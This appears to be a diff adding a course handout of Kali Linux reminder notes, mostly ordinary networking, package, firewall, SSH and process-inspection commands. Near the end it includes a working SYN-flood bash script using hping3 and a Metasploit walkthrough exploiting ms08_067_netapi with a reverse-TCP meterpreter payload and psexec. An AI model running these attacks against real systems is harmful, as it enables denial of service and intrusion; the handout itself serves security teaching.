@@ -1,0 +1,282 @@
+If you wish to follow along with the instructor using 
+Kali Linux, download Kali for free from:
+
+     http://www.kali.org
+
+Default username is "root", password is "toor".
+
+Run "startx" to load the GUI desktop if necessary.
+
+
+
+
+Here are some reminder notes about configuration:
+
+#######################################################
+     Change IP Address (Permanent)
+#######################################################
+man interfaces
+gedit /etc/network/interfaces
+
+	#auto eth0
+	#iface eth0 inet dhcp
+
+	auto eth0
+	iface eth0 inet static
+	address 10.1.1.1
+	netmask 255.255.0.0
+	gateway 10.1.1.2
+
+ifdown eth0
+ifup eth0
+
+
+
+#######################################################
+     Change IP Address (Temporary)
+#######################################################
+ifconfig eth0 192.168.1.188 netmask 255.255.255.0 up
+route add default gw 192.168.1.1
+echo nameserver 192.168.1.3 > /etc/resolv.conf
+
+
+
+#######################################################
+     Release and Renew DHCP IP Addresses
+#######################################################
+dhclient -r
+dhclient
+
+
+
+#######################################################
+     Network Monitoring
+#######################################################
+netstat -lunt           #Show listening TCP/UDP ports.
+route -n                #Show routing table.
+iptraf                  #Various networking stats.
+tcpdump                 #Sniff packets.
+
+
+
+#######################################################
+     Password, User and Group Management
+#######################################################
+passwd <username>
+
+id [<username>]
+
+adduser <username>
+deluser <username>
+cat /etc/passwd
+
+addgroup <groupname>
+delgroup <groupname>
+cat /etc/group
+
+
+
+#######################################################
+     Daemons
+#######################################################
+runlevel
+telinit <new-run-level>
+
+ls /etc/init.d
+ls /etc/rc2.d  (if at runlevel 2)
+
+service --status-all
+service cron status|start|stop|restart 
+
+netstat -plunt
+ps -auxf
+
+
+
+#######################################################
+     Package Management
+#######################################################
+dpkg -l                       # List installed packages.
+dpkg -S <path-to-binary>      # Who owns this file?                
+apt-cache search <regex>      # Search available pkgs.
+apt-get update                # Update available pkgs.
+apt-get install <pkg>         # Install a pkg.
+apt-get remove <pkg>          # Uninstall a pkg.  
+apt-get check <pkg>           # Integrity check and fix. 
+apt-get upgrade               # Install latest versions.
+
+
+
+#######################################################
+     Firewall (iptables)
+#######################################################
+iptables -L
+iptables -A|-D|-F <chain> <options>
+<chain> = INPUT | FORWARD | OUTPUT | PREROUTING | POSTROUTING 
+<options> =
+	-t = table = FILTER (default) | NAT | MANGLE
+	-p = protocol = udp | tcp
+	-s = source = 0/0 (any)
+	-d = destination
+	-i = input interface
+	-o = output interface
+	-j = jump target = DROP | REJECT | ACCEPT | LOG | DNAT | SNAT | MASQUERADE
+	-p udp|tcp --dport = destination port
+	-p udp|tcp --sport = source port
+	-m --state = ESTABLISHED | NEW | RELATED | INVALID
+
+
+echo 1 > /proc/sys/net/ipv4/tcp_syncookies
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+              
+
+#######################################################
+     RDP and SMB
+#######################################################
+rdesktop &
+
+smbclient -U <username> -W <domain> //server/share
+smbclient -U <username> -W <domain> //server/share "<passphrase>"
+?
+ls
+!ls
+!pwd
+get ...
+put ...
+quit
+
+
+
+#######################################################
+     SSH
+#######################################################
+service ssh status                  # Is it running?
+service ssh start                   # Start sshd.
+apt-get install ssh                 # If not installed.
+ssh root@192.168.1.3                # In Linux.
+putty.exe root@192.168.1.3          # In Windows.
+
+
+
+#######################################################
+     Understanding Libraries
+#######################################################
+ELF header indicates which dynamic loader to use (/lib/ld-linux.so.*)
+Loader searches for libraries in the following order:
+      Absolute or relative paths defined in the binary itself.
+      Paths defined in LD_LIBRARY_PATH (except for setuid programs).
+      Paths defined in /etc/ld.so.cache.
+      /lib
+      /usr/lib
+/etc/ld.so.cache is rebuilt by running 'ldconfig -v'.
+/etc/ld.so.conf specifies more places ldconfig should include.
+'ldconfig -p' lists current contents of ld.so.cache file.
+'ldd /sbin/ifconfig' shows the libraries required for ifconfig.
+'ltrace -c ifconfig' show stats about library calls for ifconfig.
+
+
+
+#######################################################
+     Understanding Processes and Memory
+#######################################################
+htop (or just top)      #Running process tree and load.
+ps -auxf                #Show processes and their parents.
+strace ifconfig         #Show system calls of ifconfig.
+strace -p <PID#>        #System calls of a running process.
+lsof                    #List open files, sockets, and other things.
+lsof -c ssh*            #Only processes matching ssh*.
+lsof -i                 #Only network connections
+lsof -u jim             #Only processes owned by jim.
+lsof -p 1307            #Only process ID number 1307.
+lsof -a -u jim -i       #Use '-a' for logical AND.
+w                       #Who's logged on and running what.
+vmstat -s               #Virtual memory stats.
+free -mo                #MB of free memory and swap.
+
+
+
+#######################################################
+     SYN Flooding
+#######################################################
+#!/bin/bash
+# Copy this text to a new file: synflood.bash
+# Usage: synflood.bash 10.1.1.1 80
+# Don't forget to: chmod 777 synflood.bash
+# and if you copied it from Windows: dos2unix synflood.bash
+
+# Because hping replies with resets, the resets must be dropped.
+
+iptables -A OUTPUT -p tcp -d $1 -m tcp --tcp-flags SYN,ACK,FIN,RST RST -j DROP
+
+# Use random source IPs only when target has default route to Internet;
+# otherwise, flood using the attacker's source IP when lab testing.
+
+# hping3 --flood --rand-source -S -p $2 $1 
+hping3 --flood -S -p $2 $1 
+
+iptables -D OUTPUT -p tcp -d $1 -m tcp --tcp-flags SYN,ACK,FIN,RST RST -j DROP 
+
+
+
+#######################################################
+     Metasploit Console
+#######################################################
+msfupdate
+msfconsole
+search -t exploit/windows/smb            # See 'help search'.
+info exploit/windows/smb/                # Use tab completion.
+use exploit/windows/smb/ms08_067_netapi  # Use tab completion.
+show options                             # After exploit selected.
+set rhost 192.168.1.179
+info payload/windows/meterpreter/reverse_tcp 
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.151
+exploit                                  # Should get meterpreter.
+help                                     # Show meterpreter help.
+background
+sessions -l                              # List sessions.
+sessions -i 1                            # Interact with session 1.
+
+# Misc
+connect [-s] <ipaddr> <port>             # Netcat-like, -s for SSL.
+setg <variable> <data> ; save            # Load saved globals next time.
+
+# To install meterpreter with a username and password/hash:
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/bind_tcp
+show options
+set ...
+
+
+
+#######################################################
+     systemd
+#######################################################
+
+# A unit is something managed by systemd, like a service
+systemctl
+systemctl list-units --all
+systemctl list-units --type service --all
+
+# A unit is represented by a config file of the same name
+ls -la /lib/systemd/system
+
+# Override a default unit file with another one here
+ls -la /etc/systemd/system
+
+# List processes in a tree of service control groups
+systemd-cgls
+
+# Service management
+systemctl status <name.service>
+systemctl start <name.service>
+systemctl stop <name.service>
+systemctl restart <name.service>
+systemctl reload <name.service>
+systemctl is-active <name.service>
+
+
+
+
+
